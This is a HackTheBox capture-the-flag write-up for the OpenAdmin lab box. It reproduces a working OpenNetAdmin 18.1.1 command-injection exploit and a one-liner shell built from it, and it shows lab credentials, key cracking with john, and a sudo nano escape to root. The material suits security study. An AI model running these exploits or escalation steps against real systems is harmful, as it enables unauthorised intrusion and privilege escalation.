---
title:  "HackTheBox: OpenAdmin"
date:   2020-09-17 16:15:35 
categories:
  - Blog
tags: 
  - Security 
  - CTF
---


# Intro & tldr
The machine OpenAdmin from hacktebox.eu is a Linux-based box with rated with easy as a difficulty. In order to finish the box one must exploit a **RCE** in **OpenNetAdmin** *18.1.1* to get the initial foothold[^1]. Then after some local recon we find a password for one user, where we after some more recon can find a private key for the next user that we need to crack with ssh2john[^2]. This gives us the flag for user, but for root flag we need to abuse sudo privileges of the user with nano or get a root shell by a similar axploit[^3].

This was maybe the second or third box I ever hacked and I was not really good at taking notes or printscreens to document the process, to make up for that I purchased VIP and redid the box from the beginning. But I learned a great deal on both runs at the box and especially when writing this post!

![Logo for OpenAdmin](https://dvardoo.github.io/images/openadmin/openadmin.jpg "Logo for OpenAdmin")
{: .full}


* toc
{:toc}


# Recon and enumeration
## Open ports
First of let's check what ports are open on the machine: 
~~~
$ nmap -p- -sC -sV 10.10.10.171
~~~

~~~
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 19:59 CEST


Nmap scan report for 10.10.10.171
Host is up (0.053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds
~~~

This gives us two open ports. Standard SSH and standard HTTP. Next step will be to enumerate the webpages as a standard visit to [IP:PORT] only displays a Apache2 default page.

## Web enumeration
Lets se if we can find something interesting by enumerating the directories:
~~~
$ gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
~~~

Which gives us the following directories to inspect further: 
~~~
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/15 22:50:13 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/15 23:06:49 Finished
===============================================================
~~~

By inspecting both /artwork and /sierra I found two template pages with nothing of interest. Both of the pages contain a contact form where at least /sierra maybe has a working form as something happens when I try to submit a message. Upon inspecting /music one finds a mostly empty template of a page, but upon hoovering over the login I see that the url redirects to 10.10.10.171/ona. 


By inspecting /ona we are see that it's running OpenNetAdmin and it also informs us that it's a old version needing a update. 

![OpenNetAdmin index](https://dvardoo.github.io/images/openadmin/ona2.jpg "OpenNetAdmin index")
{: .full}

# Foothold
Now lets find see if we can find a exploit for that version: 
~~~
$ searchsploit opennetadmin 18.1.1
~~~

Gives us the following exploits to use: 
~~~
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                 | php/webapps/47691.sh
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
~~~

Copy the exploit: 
~~~
$ searchsploit -m 47691
~~~

Inspect it: 
~~~
$ cat 47691.sh
~~~

~~~
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
~~~

By modifying the URL-part of the exploit and ponting it to the actual IP we can get a shell. Here I ran into some issues with the exploit as it would not run because of end of line characters. After trying a few times I made it into a working oneliner:

~~~
$ while true;do echo -n "$ "; read cmd;curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1;done
~~~

This exploit gives a partially working shell as user www-data.

![Exploit and id www-data](https://dvardoo.github.io/images/openadmin/id-www.jpg "Exploit and id www-data")
{: .full}

This restricted shell was quite a hassle but I used the following to get an idea of the files: 
~~~
$ ls -laR
~~~

And then simply used `cat [FILE/PATH/FILE]` to search for something interesting. After a while I found a interesting file:

~~~
$ cat local/config/database_settings.inc.php
~~~

~~~
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
~~~

Also by using `ls` on /home-directory I found two different users: jimmy and joanna.
~~~
$ ls /home
~~~

~~~
jimmy
joanna
~~~

So now we have a suspected password and a user to try!


## Local recon
First let's try to login:
~~~
$ ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: n1nj4W4rri0R!
~~~

Success! But a quick look in jimmys home directory does not give us a flag. So problably going to need to move lateraly over to the user joanna. 

A local recon with:
~~~
$ netstat -l
~~~

Gives us the following:
~~~
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:*                          
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     13804    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     209966   /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     209970   /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     209971   /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     209972   /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     209973   /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     209974   /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     18566    @irqbalance576.sock
unix  2      [ ACC ]     STREAM     LISTENING     13723    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     16374    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     13736    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     13739    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     13761    /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     16372    /var/lib/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     20290    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     16041    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     16190    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     16191    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     16197    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     16199    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     16205    /run/uuidd/request
~~~



Using `netcat` on port 3306 gives us a garbled text about mySQL password, but entering the previous db password does not work. The same procedure on port 52846 just gives us a HTML-page for Apache. So may be something web related, let's check in /www:
~~~
$ ls -la /var/www/
~~~

Results in: 
~~~
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
~~~

So jimmy has a directory with the group internal, which was one of the things mentioned from the HTML-page from port 52846. Let's look closer at the contents in the directory:
~~~
$ ls -laR /var/www/internal/
~~~

~~~
/var/www/internal/:
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
~~~

Looking at main.php gives us this: 
~~~
$ cat /var/www/internal/main.php
~~~

~~~
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
~~~

# User and priv escalation

## User
So it seems we can get the user joannas private key from port 52846 and it has a “ninja” password. First I tried with `netcat` but after a while I figured it would be easier to just use `curl` for the request:
~~~
$ curl http://localhost:52846/main.php
~~~

~~~
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
~~~

Let's save the key, modify the keys permissions and se if we can use it to log in as joanna! Partial success, seems that there is some other password and not “ninja” for the key. We can check for how many other password candidates there is in rockyou.txt in the following way: 
~~~
$ cat /usr/share/wordlists/rockyou.txt | grep -i ninja | wc -l
~~~

This gives us 1766 passwords with the word "ninja" in, far to many to try manually. After a bit of googe-fu I found this article[^2] talking about ssh2john to be able to crack the password for the key.

Download ss2john: 
~~~
$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
~~~

Running ssh2john: 
~~~
$ python ssh2john.py joanna_rsa > joanna_hash
~~~

Create a wordlist with the word “ninja” from rockyou.txt:
~~~
$ cat /usr/share/wordlists/rockyou.txt | grep -i ninja > list.txt
~~~

Running `john` to crack the hash using the wordlist:
~~~
$ john --wordlist=list.txt joanna_hash
~~~ 

~~~
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_rsa)
1g 0:00:00:00 DONE (2020-09-16 17:29) 100.0g/s 176500p/s 176500c/s 176500C/s *69flyingninjamonkeys..#1FLUFFYCOCKYNINJA
Session completed
~~~

So lets try the key with the password "bloodninjas":

~~~
$ ssh joanna@10.10.10.171 -i joanna_rsa
joanna@10.10.10.171's password: bloodninjas
~~~

After a successful login we find the user-flag in joannas home directory!

![User flag](https://dvardoo.github.io/images/openadmin/user-flag.jpg "User flag")
{: .full}

Now let's se how we can escalate our privileges to get to the root account!

## Root
Let's start by finding out what joanna is allowed to do with elevated privileges:
~~~
$ sudo -l
~~~

Gives us:
~~~
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
~~~

So we can use `nano` as sudo without the password that we don't have, basicly by using the full filepath:
~~~
$ sudo /bin/nano /opt/priv
~~~

We can then use a shortcut in nano to get information from other files by pressing `CTRL + R` and then insert /root/root.txt to insert the flag in the open file: 

![Root flag](https://dvardoo.github.io/images/openadmin/root-flag.jpg "Root flag")
{: .full}

But if we really want to get to the root account instead we can do as proposed[^3] and use the following shortcuts in `nano`: 

~~~
$ sudo /bin/nano /opt/priv
CTRL + R
CTRL + X
reset; sh 1>&0 2>&0
~~~

All this is made possible due to the fact that `nano` does not drop the elevated priveleges and thus can be abused.

![Root shell](https://dvardoo.github.io/images/openadmin/root-id.jpg "Root shell")
{: .full}
![Root shell and root flag](https://dvardoo.github.io/images/openadmin/root-flag2.jpg "Root shell and root flag")
{: .full}

# References
[^1]: https://www.exploit-db.com/exploits/47691
[^2]: https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/ 
[^3]: https://gtfobins.github.io/gtfobins/nano/#sudo 
